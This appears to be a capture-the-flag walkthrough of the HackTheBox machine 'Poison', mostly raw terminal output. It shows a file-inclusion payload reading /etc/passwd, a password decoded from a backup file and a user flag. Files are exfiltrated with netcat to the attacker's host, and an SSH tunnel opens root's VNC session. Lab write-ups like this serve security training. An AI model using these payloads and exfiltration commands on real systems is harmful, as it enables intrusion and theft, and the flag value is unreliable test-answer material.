---
title: "HackTheBox - Poison"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

root@kali:~# nmap -sC -sV 10.10.10.84 [134/134]  
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-14 10:25 CEST  
Nmap scan report for 10.10.10.84  
Host is up (0.073s latency).  
Not shown: 998 closed ports  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)  
| ssh-hostkey:  
| 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)  
| 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)  
|_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)  
80/tcp open http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)  
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32  
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).  
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 32.78 seconds  
root@kali:~# ssh charix@10.10.10.84  
The authenticity of host '10.10.10.84 (10.10.10.84)' can't be established.  
ECDSA key fingerprint is SHA256:rhYtpHzkd9nBmOtN7+ft0JiVAu8qnywLb48Glz4jZ8c.  
Are you sure you want to continue connecting (yes/no)? yes  
Warning: Permanently added '10.10.10.84' (ECDSA) to the list of known hosts.  
Password for charix@Poison:  
Last login: Fri Sep 14 09:12:56 2018 from 10.10.13.151  
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

http://10.10.10.84/browse.php?file=/etc/passwd

# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # root:*:0:0:Charlie &:/root:/bin/csh toor:*:0:0:Bourne-again Superuser:/root: daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin operator:*:2:5:System &:/:/usr/sbin/nologin bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin news:*:8:8:News Subsystem:/:/usr/sbin/nologin man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin _pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin _ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin _tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin charix:*:1001:1001:charix:/home/charix:/bin/csh

http://10.10.10.84/browse.php?file=listfiles.php

Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt )

http://10.10.10.84/browse.php?file=pwdbackup.txt

This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=

https://gchq.github.io/CyberChef/

charix@Poison:~ % ls -alh  
total 64  
drwxr-x--- 3 charix charix 512B Sep 14 09:15 .  
drwxr-xr-x 3 root wheel 512B Mar 19 16:08 ..  
-rw------- 1 charix charix 51B Sep 14 09:04 .Xauthority  
-rw-r----- 1 charix charix 1.0K Mar 19 17:16 .cshrc  
-rw-rw---- 1 charix charix 0B Sep 14 09:15 .history  
-rw-r----- 1 charix charix 254B Mar 19 16:08 .login  
-rw-r----- 1 charix charix 163B Mar 19 16:08 .login_conf  
-rw-r----- 1 charix charix 379B Mar 19 16:08 .mail_aliases  
-rw-r----- 1 charix charix 336B Mar 19 16:08 .mailrc  
-rw-r----- 1 charix charix 802B Mar 19 16:08 .profile  
-rw-r----- 1 charix charix 281B Mar 19 16:08 .rhosts  
-rw-r----- 1 charix charix 849B Mar 19 16:08 .shrc  
drwx------ 2 charix charix 512B Sep 14 09:04 .vnc  
-rw-r--r-- 1 charix charix 166B Sep 14 08:03 nc  
-r--r--r-- 1 charix charix 0B Sep 14 07:42 secret  
-rw-r----- 1 root charix 166B Mar 19 16:35 secret.zip  
-r--r--r-- 1 charix charix 8B Sep 14 08:47 secreths  
-rw-r----- 1 root charix 33B Mar 19 16:11 user.txt  
charix@Poison:~ % cat user.txt  
eaacdfb2d141b72a589233063604209c  
charix@Poison:~ % nc 10.10.13.81 4444 < secret.zip  
charix@Poison:~ % sockstat -l | grep root  
root sendmail 651 3 tcp4 127.0.0.1:25 *:*  
root httpd 632 3 tcp6 *:80 *:*  
root httpd 632 4 tcp4 *:80 *:*  
root sshd 626 3 tcp6 *:22 *:*  
root sshd 626 4 tcp4 *:22 *:*  
root Xvnc 545 0 stream /tmp/.X11-unix/X1  
root Xvnc 545 1 tcp4 127.0.0.1:5901 *:*  
root Xvnc 545 3 tcp4 127.0.0.1:5801 *:*  
root syslogd 406 4 dgram /var/run/log  
root syslogd 406 5 dgram /var/run/logpriv  
root syslogd 406 6 udp6 *:514 *:*  
root syslogd 406 7 udp4 *:514 *:*  
root devd 335 4 stream /var/run/devd.pipe  
root devd 335 5 seqpac /var/run/devd.seqpacket.pipe  
charix@Poison:~ %

root@kali:~# ifconfig tun0  
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500  
inet 10.10.13.81 netmask 255.255.252.0 destination 10.10.13.81  
inet6 fe80::4831:3118:ce71:2403 prefixlen 64 scopeid 0x20<link>  
inet6 dead:beef:2::114f prefixlen 64 scopeid 0x0<global>  
unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 100 (UNSPEC)  
RX packets 1484 bytes 129741 (126.7 KiB)  
RX errors 0 dropped 0 overruns 0 frame 0  
TX packets 2007 bytes 118530 (115.7 KiB)  
TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

root@kali:~# nc -lnvp 4444 > secret.zip  
listening on [any] 4444 ...  
connect to [10.10.13.81] from (UNKNOWN) [10.10.10.84] 29260  
root@kali:~# unzip secret.zip  
Archive: secret.zip  
[secret.zip] secret password:  
extracting: secret  
root@kali:~# cat secret  
[|Ֆz!

root@kali:~# ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84  
Password for charix@Poison:  
Last login: Fri Sep 14 11:02:28 2018 from 10.10.13.81  
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/  
Security Advisories: https://www.FreeBSD.org/security/  
FreeBSD Handbook: https://www.FreeBSD.org/handbook/  
FreeBSD FAQ: https://www.FreeBSD.org/faq/  
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/  
FreeBSD Forums: https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/  
directory, or can be installed later with: pkg install en-freebsd-doc  
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed: freebsd-version ; uname -a  
Please include that output and any error messages when posting questions.  
Introduction to manual pages: man man  
FreeBSD directory layout: man hier

Edit /etc/motd to change this login announcement.  
To repeat the last command in the C shell, type "!!".  
-- Dru <genesis@istar.ca>  
charix@Poison:~ %

neuer Tab!!!

root@kali:~# netstat -antp  
Active Internet connections (servers and established)  
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name  
tcp 0 0 127.0.0.1:5901 0.0.0.0:* LISTEN 21793/ssh  
tcp 0 0 127.0.0.1:5432 0.0.0.0:* LISTEN 613/postgres  
tcp 0 0 10.10.13.81:40500 10.10.10.84:22 ESTABLISHED 21565/ssh  
tcp 0 0 10.10.13.81:40510 10.10.10.84:22 ESTABLISHED 21793/ssh  
tcp6 0 0 ::1:5901 :::* LISTEN 21793/ssh  
tcp6 0 0 ::1:5432 :::* LISTEN 613/postgres  
root@kali:~# xtightvncviewer -passwd secret localhost:5901  
Connected to RFB server, using protocol version 3.8  
Enabling TightVNC protocol extensions  
Performing standard VNC authentication  
Authentication successful  
Desktop name "root's X desktop (Poison:1)"  
VNC server default format:  
32 bits per pixel.  
Least significant byte first in each pixel.  
True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
Using default colormap which is TrueColor. Pixel format:  
32 bits per pixel.  
Least significant byte first in each pixel.  
True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
Same machine: preferring raw encoding